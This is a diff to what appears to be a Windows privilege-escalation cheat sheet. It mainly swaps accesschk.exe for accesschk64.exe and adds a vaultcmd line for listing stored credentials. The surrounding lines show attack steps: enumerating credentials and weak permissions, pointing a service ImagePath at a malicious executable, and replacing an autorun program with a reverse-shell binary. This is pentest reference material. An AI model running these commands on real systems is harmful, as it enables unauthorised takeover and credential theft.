@@ -51,6 +51,7 @@ cmdkey /add:MyServer /user:MyUser /pass:MyPassword
 ```
 vaultcmd /list
 vaultcmd /listcreds:"Web Credentials" /all
+vaultcmd /listcreds:"Windows Credentials" 
 ```
 
 ## 🔹Programs and Processes🔹
@@ -78,7 +79,7 @@ icacls FILE
 
 ## 🔹Acccess Permission🔹
 ```
-accesschk.exe /accepteula -dqv "C:\Python27"
+accesschk64.exe /accepteula -dqv "C:\Python27"
 cacls "C:\Python27"
 ```
 
@@ -132,29 +133,29 @@ sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
 
 ```
 🔺 List all services and the permissions each user level has on them.
-accesschk.exe /accepteula -ucqv *
+accesschk64.exe /accepteula -ucqv *
 
 🔺List permissions for a specific service:
-accesschk.exe /accepteula -ucqv Spooler
+accesschk64.exe /accepteula -ucqv Spooler
 
 🔺List permissions for a specific directory:
-accesschk.exe /accepteula -dqv "C:\Users"
+accesschk64.exe /accepteula -dqv "C:\Users"
 
 🔺(BINARY_PATH_NAME) file is writable?
-accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+accesschk64.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 
 🔺Find all weak folder:
-accesschk.exe /accepteula -uwdqs Users C:\
-accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
+accesschk64.exe /accepteula -uwdqs Users C:\
+accesschk64.exe /accepteula -uwdqs "Authenticated Users" C:\
 
 🔺Find all weak files::
-accesschk.exe /accepteula -uwqs Users C:\*.*
-accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
+accesschk64.exe /accepteula -uwqs Users C:\*.*
+accesschk64.exe /accepteula -uwqs "Authenticated Users" C:\*.*
 
 
 🔺List services which the "Authenticated Users" user group have permissions over
 🔺(remember to check other user groups you are a member of).
-accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk64.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
 ## 💠Weak Permission on Service Binary💠 
@@ -190,7 +191,7 @@ C:\Users\Quickemu\Downloads\Example.exe
 sc.exe qc <SERVICE>
 
 🔺Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
-accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+accesschk64.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
 
 🔺Overwrite the ImagePath to malicious executable
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\malware.exe /f
@@ -226,7 +227,7 @@ Get-ScheduledTask | ForEach-Object { $_.Actions }
 ## ⭐⭐Startup Apps⭐⭐
 ```
 1.  Note that the BUILTIN\Users group can write files to the StartUp directory:
-accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+accesschk64.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
   Medium Mandatory Level (Default) [No-Write-Up]
@@ -309,7 +310,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
     My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
 
 🔺 Check if AutoRun Executable is writable
-accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 
 🔺Overwrite exe
 C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
